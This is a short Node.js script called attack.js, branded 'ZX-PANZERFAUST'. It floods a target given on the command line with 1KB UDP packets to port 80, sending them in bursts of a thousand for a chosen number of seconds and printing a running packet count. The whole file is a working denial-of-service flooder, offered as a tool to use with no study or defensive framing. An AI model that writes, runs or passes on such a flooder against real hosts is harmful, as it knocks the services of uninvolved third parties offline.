const dgram = require('dgram');
const [target, time] = process.argv.slice(2);

if (!target || !time) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

const socket = dgram.createSocket('udp4');
let pings = 0;
const endTime = Date.now() + (parseInt(time) * 1000);

// Make a dummy payload
const payload = Buffer.alloc(1024, 'X'); // 1KB of 'X'

const spam = () => {
    if (Date.now() > endTime) {
        process.stdout.write(`\nZX-PANZERFAUST DONE\nTotal pings: ${pings}\n`);
        process.exit(0);
    }

    // Blast like crazy
    for (let i = 0; i < 1000; i++) {
        socket.send(payload, 0, payload.length, 80, target); // UDP port 80
        pings++;
    }

    setImmediate(spam);
};

// Logging every 2s, overwrite-style
setInterval(() => {
    process.stdout.write(`\rZX-PANZERFAUST pings: ${pings}`);
}, 2000);

// GO TIME
spam();
